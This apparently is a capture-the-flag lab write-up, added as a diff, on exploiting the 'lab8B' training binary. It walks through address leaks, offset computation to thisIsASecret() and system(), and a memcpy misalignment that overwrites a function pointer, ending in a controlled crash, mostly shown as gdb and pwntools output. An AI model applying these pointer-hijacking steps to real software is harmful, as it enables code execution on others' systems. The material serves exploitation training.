@@ -1,0 +1,331 @@
+OK, so we already know how to leak code and libc,
+we also do know how to overflow the pointer to get codexec,
+we should even be able to easily do it the bonus round way!
+
+Our limitations are as follows:
+
+We can only add the sum vector (v3) to the faves[i] array (hardcoded in the fav() function):
+
+Also, we can't enter data into the sum vector manually. Finally, we can't have the sum vector value set to the actual sum of the two v1 and v2 vectors if any of their elements is equal 0:
+
+This makes us have to pick the values in such a way that their sum equals the value we want to have in the particular memory cell (pointer byte in our case). For achieving 0 we'll have to cause an integer overflow.
+
+Once we get the sum we want, we can add it to favs multiple times (good for us, simpler interaction).
+
+
+Also, we can't call the printFunc() pointer fromt he favs themselves. Instead, after achieving a value we want in the printFunct pointer, we have to load it back to one of the two (v1 or v2) vectors and then call printing.
+
+
+
+
+
+OK, let's start with leaking printf() and printVector() addresses. We'll also calculate the offsets from their neighbors - thisIsASecret() and system().
+
+Then we'll examine how the data is aligned in memory.
+
+To make the particular structure fields easier to distinguish in the output, let's initiate all the numbers with different values (starting from "1" + the char with "A"):
+
+[ screenshot from the exploit_leak_and_init_first_vector.py ]
+
+    'I COMMAND YOU TO ENTER YOUR COMMAND: '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0xe bytes:
+    'Which vector? '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0x391 bytes:
+    'Address: 0x80003040\n'
+    'void printFunc: 0x800010e9\n'
+    'char a: A\n'
+    'short b: 2\n'
+    'unsigned short c: 3\n'
+    'int d: 4\n'
+    'unsigned int e: 5\n'
+    'long f: 6\n'
+    'unsigned long g: 7\n'
+    'long long h: 8\n'
+    'unsigned long long i: 9\n'
+    '+------------------------------------------------------------+\n'
+    '|                                                            |\n'
+    '|  1. Enter data                                          :> |\n'
+    '|  2. Sum vectors                                         :] |\n'
+    '|  3. Print vector                                        :3 |\n'
+    '|  4. Save sum to favorites                               8) |\n'
+    '|  5. Print favorites                                     :O |\n'
+    '|  6. Load favorite                                       :$ |\n'
+    '|  9. Get help                                            :D |\n'
+    '|                                                            |\n'
+    '+------------------------------------------------------------+\n'
+    'I COMMAND YOU TO ENTER YOUR COMMAND: '
+('Leaked v1() address: ', '0x80003040')
+('Leaked printFunc() address: ', '0x800010e9')
+PID: [2843]
+[*] Paused (press any to continue)
+
+gdb -p 2843
+...
+gdb-peda$ x/100wx 0x80003040
+0x80003040 <v1>:        0x800010e9      0x00020041      0x00000003      0x00000004
+0x80003050 <v1+16>:     0x00000005      0x00000006      0x00000007      0x00000008
+0x80003060 <v1+32>:     0x00000000      0x00000009      0x00000000      0x00000000
+0x80003070:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003080 <v3>:        0xb7e70280      0x00000000      0x00000000      0x00000000
+0x80003090 <v3+16>:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800030a0 <v3+32>:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800030b0:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x800030c0 <faves>:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800030d0 <faves+16>:  0x00000000      0x00000000      0x00000000      0x00000000
+0x800030e0 <faves+32>:  0x00000000      0x00000000      0x00000000      0x00000000
+0x800030f0:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003100 <v2>:        0xb7e70280      0x00000000      0x00000000      0x00000000
+0x80003110 <v2+16>:     0x00000000      0x00000000      0x00000000      0x00000000
+0x80003120 <v2+32>:     0x00000000      0x00000000      0x00000000      0x00000000
+0x80003130:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003140:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003150:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003160:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003170:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003180:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x80003190:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x800031a0:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x800031b0:     		0x00000000      0x00000000      0x00000000      0x00000000
+0x800031c0:     		0x00000000      0x00000000      0x00000000      0x00000000
+
+The offsets of interest:
+
+gdb-peda$ p thisIsASecret
+$2 = {<text variable, no debug info>} 0x800010a7 <thisIsASecret>
+gdb-peda$ p printVector
+$3 = {<text variable, no debug info>} 0x800010e9 <printVector>
+gdb-peda$ p 0x800010e9-0x800010a7
+$4 = 0x42
+
+gdb-peda$ p printf
+$5 = {<text variable, no debug info>} 0xb7e70280 <__printf>
+gdb-peda$ p system
+$6 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
+gdb-peda$ p 0xb7e70280-0xb7e63190
+$7 = 0xd0f0
+
+Looking at the vuln:
+		memcpy(faves[i], (int*)(&v3)+i, sizeof(struct vector)); 
+we can see that as i increments, (int*)(&v3)+i will result in data being read from higher offsets (offset equal to the number of existing faves), this way at proper alignment (carefully picked number of favs and carefully crafted sum field/fields) we will have the sum field we control used to overwrite our fav's print pointer
+	} // if I estimate correctly, after adding 4 favs, the fifth fav will have its printFunc pointer overwritten with v3's abc bytes.
+One more look:
+gdb-peda$ x/100wx 0x80003040
+0x80003040 <v1>:        0x800010e9      0x00020041
+
+OK, so 0x80003044 is 0x00020041, which is 0x00002 (short int we control in its entirety) and 0x0041 (we control only one byte). Hence, this alignment is not sufficient. We are going to need to add more favs to reach the offset we need (to skip the nullbyte). Or maybe not, as a matter of fact, for the basic solution (as opposed to the bonus one) a partial overwrite would do. 
+
+Just to be clear what's where:
+
+gdb-peda$ x/1w 0x80003040
+0x80003040 <v1>:        0x800010e9
+gdb-peda$ x/1w 0x80003044
+0x80003044 <v1+4>:      0x00020041
+gdb-peda$ x/1b 0x80003044
+0x80003044 <v1+4>:      0x41
+gdb-peda$ x/1b 0x80003045
+0x80003045 <v1+5>:      0x00
+gdb-peda$ x/1b 0x80003046
+0x80003046 <v1+6>:      0x02
+gdb-peda$ x/1b 0x80003047
+0x80003047 <v1+7>:      0x00
+
+OK, we could do a partial overwrite of the target structure's printVector() pointer (overwrite just its least significant byte) by using i=7? and getting our char to be 0xa7 instead of 0x41). Fuck, no, we can't. Although we have influence on what is the start index of the data that is read from v3, we have no such control over the destination. The destination (faves[i]) will always be written starting at its beginning. Hence, we have to rewrite the entire pointer, which also means we will have to attain nullbytes if we want to use the thisIsSecret() pointer. At this point it starts to seem to me that using system() instead (the bonus version) could actually be easier here, as we would only need to take care of creating a script in the current path, with name corresponding to the character/string before the first nullbyte within the rest of the structure (abc fields, a would suffice with b being naturally null-padded as it is).
+
+Either way, we will try both approaches becasue we want to :D
+
+We already know that fav[0] will be a complete copy of v3.
+fav[1] will be a copy of *(v3+1), which means its printFunc pointer will consist of three bytes of the v3's printFunc pointer and one byte of the 'a' character. 
+fav[2] will consist of two (find out whether last...)
+
+Ah, fuck it, let's just do this to see ourselves.
+
+So, we want our v3 sum to consist of consecutive capital letters, 'A','B','C' and so on.
+
+This will make it easy to distinguish which bytes of the v3 vector are being copied to which bytes of the particular fav[i] structure, as the 'i' offset grows. 
+As our v3 has to come from a sum of non-zero values, we will simply fill the first vector with incrementing natural numbers, starting at 0x1, while filling all the fields in the second vector with 0x40.
+
+We can achieve 0x40 in particular memory cells by putting the following values in, depending on the type:
+char:  @			(chr(0x40))
+short: 16448		(printf "%d" 0x4040)
+long:  1077952576	(printf "%d" 0x40404040)
+
+
+$./sizeof
+
+sizeof char: 1
+sizeof short: 2
+sizeof unsigned short: 2
+sizeof int: 4
+sizeof unsigned int: 4
+sizeof long: 4
+sizeof unsigned long: 4
+sizeof long long: 8
+sizeof unsigned long long: 8
+sizeof(struct vector) is: 44
+
+
+This is how are getting this summed:
+
+gdb-peda$ x/100wx &v1
+0x80003040 <v1>:        0x800010e9      0x00020001      0x00000003      0x00000004
+0x80003050 <v1+16>:     0x00000005      0x00000006      0x00000007      0x00000008
+0x80003060 <v1+32>:     0x00000000      0x00000009      0x00000000      
+
+gdb-peda$ x/100wx &v2
+0x80003100 <v2>:        0x800010e9      0x40400040      0x00004040      0x40404040
+0x80003110 <v2+16>:     0x40404040      0x40404040      0x40404040      0x40404040
+0x80003120 <v2+32>:     0x40404040      0x40404040      0x40404040      
+
+gdb-peda$ x/100wx &v3
+0x80003080 <v3>:        0xb7e70280      0x40420041      0x00004043      0x40404044
+0x80003090 <v3+16>:     0x40404045      0x40404046      0x40404047      0x40404048
+0x800030a0 <v3+32>:     0x40404040      0x40404049      0x40404040
+
+Now, the best way to see our options here is to simply add this v3 result to favorites 10 times (as we can't do more) and examine the resulting fav[i] printFunc pointer. Once we identify and pick the most favorable offset (one that allows us to fully control the pointer), we'll pick the v1 and v2 values once again so their sum is what we want and exploit it.
+
+gdb-peda$ break printMenu
+Breakpoint 1 at 0x80000abf
+
+After adding the first favorite (faves[0]):
+gdb-peda$ x/100wx faves
+0x80004008:     0xb7e70280      0x40420041      0x00004043      0x40404044
+0x80004018:     0x40404045      0x40404046      0x40404047      0x40404048
+0x80004028:     0x40404040      0x40404049      0x40404040      0x00020fd1
+0x80004038:     0x00000000      0x00000000      0x00000000      0x00000000
+
+After adding the second favorite (faves[1]):
+gdb-peda$ x/100wx faves
+0x80004008:     0xb7e70280      0x40420041      0x00004043      0x40404044
+0x80004018:     0x40404045      0x40404046      0x40404047      0x40404048
+0x80004028:     0x40404040      0x40404049      0x40404040      0x00000031
+0x80004038:     0x40420041      0x00004043      0x40404044      0x40404045
+0x80004048:     0x40404046      0x40404047      0x40404048      0x40404040
+0x80004058:     0x40404049      0x40404040      0x00000000      0x00020fa1
+0x80004068:     0x00000000      0x00000000      0x00000000      0x00000000
+
+Shit! It seems the offset on that pointer operation is not progressing by byte, but by whole dwords. Thus, the second fav already has a full print pointer overwritten with stuff from our input (0x40420041)! Anyway, offset 1 cannot be used for exploitation (unless we have some proper gadget at an address with 0x00 at its second least-significant byte), because we cannot control this nullbyte with which the char is automatically padded.
+
+The next offset (i=2, faves[2]) is even worse, as we would have the unsigned short int c being our new pointer (0x00004043 at the time of taking the above screenshot), which has two nullbytes we cannot control.
+Anyway, this is what it looks like at i=2:
+Breakpoint 1, 0x80000abf in printMenu ()
+gdb-peda$ x/100wx faves
+0x80004008:     0xb7e70280      0x40420041      0x00004043      0x40404044
+0x80004018:     0x40404045      0x40404046      0x40404047      0x40404048
+0x80004028:     0x40404040      0x40404049      0x40404040      0x00000031
+0x80004038:     0x40420041      0x00004043      0x40404044      0x40404045
+0x80004048:     0x40404046      0x40404047      0x40404048      0x40404040
+0x80004058:     0x40404049      0x40404040      0x00000000      0x00000031
+0x80004068:     0x00004043      0x40404044      0x40404045      0x40404046
+0x80004078:     0x40404047      0x40404048      0x40404040      0x40404049
+0x80004088:     0x40404040      0x00000000      0x00000000      0x00020f71
+0x80004098:     0x00000000      0x00000000      0x00000000      0x00000000
+
+Offset 3 should do the trick, however. Let's add the fourth favorite, which will be given i=3:
+
+I COMMAND YOU TO ENTER YOUR COMMAND: $ 4
+[DEBUG] Sent 0x2 bytes:
+    '4\n'
+[DEBUG] Received 0x50 bytes:
+    'I see you added that vector to your favorites, but was it really your favorite?\n'
+I see you added that vector to your favorites, but was it really your favorite?
+$
+Here's our favs now:
+
+Breakpoint 1, 0x80000abf in printMenu ()
+gdb-peda$ x/100wx faves
+0x80004008:     0xb7e70280      0x40420041      0x00004043      0x40404044
+0x80004018:     0x40404045      0x40404046      0x40404047      0x40404048
+0x80004028:     0x40404040      0x40404049      0x40404040      0x00000031
+0x80004038:     0x40420041      0x00004043      0x40404044      0x40404045
+0x80004048:     0x40404046      0x40404047      0x40404048      0x40404040
+0x80004058:     0x40404049      0x40404040      0x00000000      0x00000031
+0x80004068:     0x00004043      0x40404044      0x40404045      0x40404046
+0x80004078:     0x40404047      0x40404048      0x40404040      0x40404049
+0x80004088:     0x40404040      0x00000000      0x00000000      0x00000031
+0x80004098:     0x40404044      0x40404045      0x40404046      0x40404047
+0x800040a8:     0x40404048      0x40404040      0x40404049      0x40404040
+0x800040b8:     0x00000000      0x00000000      0x00000000      0x00020f41
+0x800040c8:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800040d8:     0x00000000      0x00000000      0x00000000      0x00000000
+
+So, if we load fav[3] to either of v1 or v2 now and ask the program to print it, we should have our crash at 0x40404044.
+
+Let's do it:
+
+gdb-peda$ c
+Continuing.
+
+I COMMAND YOU TO ENTER YOUR COMMAND: $ 6
+[DEBUG] Sent 0x2 bytes:
+    '6\n'
+[DEBUG] Received 0x10 bytes:
+    'Which favorite? '
+Which favorite? $ 3
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0xe bytes:
+    'Which vector? '
+Which vector? $ 1
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0x2e8 bytes:
+    '+------------------------------------------------------------+\n'
+    '|                                                            |\n'
+    '|  1. Enter data                                          :> |\n'
+    '|  2. Sum vectors                                         :] |\n'
+    '|  3. Print vector                                        :3 |\n'
+    '|  4. Save sum to favorites                               8) |\n'
+    '|  5. Print favorites                                     :O |\n'
+    '|  6. Load favorite                                       :$ |\n'
+    '|  9. Get help                                            :D |\n'
+    '|                                                            |\n'
+    '+------------------------------------------------------------+\n'
+    'I COMMAND YOU TO ENTER YOUR COMMAND: 
+$ 3
+[DEBUG] Sent 0x2 bytes:
+    '3\n'	
+	Which vector? 1
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+
+
+gdb-peda$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x40404044 ('D@@@')
+EBX: 0x80002fa8 --> 0x2eb0
+ECX: 0xb7fce8a4 --> 0x0
+EDX: 0x80003040 ("D@@@\001")
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff6a8 --> 0x0
+ESP: 0xbffff67c --> 0x8000154c (<main+200>:     jmp    0x8000157f <main+251>)
+EIP: 0x40404044 ('D@@@')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x40404044
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff67c --> 0x8000154c (<main+200>:    jmp    0x8000157f <main+251>)
+0004| 0xbffff680 --> 0x80003040 ("D@@@\001")
+0008| 0xbffff684 --> 0xbffff744 --> 0xbffff86f ("/tmp/lab8B")
+0012| 0xbffff688 --> 0xbffff744 --> 0xbffff86f ("/tmp/lab8B")
+0016| 0xbffff68c --> 0x1
+0020| 0xbffff690 --> 0xb7fcd3c4 --> 0xb7fce1e0 --> 0x0
+0024| 0xbffff694 --> 0x3300000d ('\r')
+0028| 0xbffff698 --> 0x80003040 ("D@@@\001")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x40404044 in ?? ()
+
+Yup.
+
+Awesome, we have all the bits and pieces to solve this the basic way (repeat these steps, so the address of thisIsASecret() is used instead of  0x40404044).
+
+
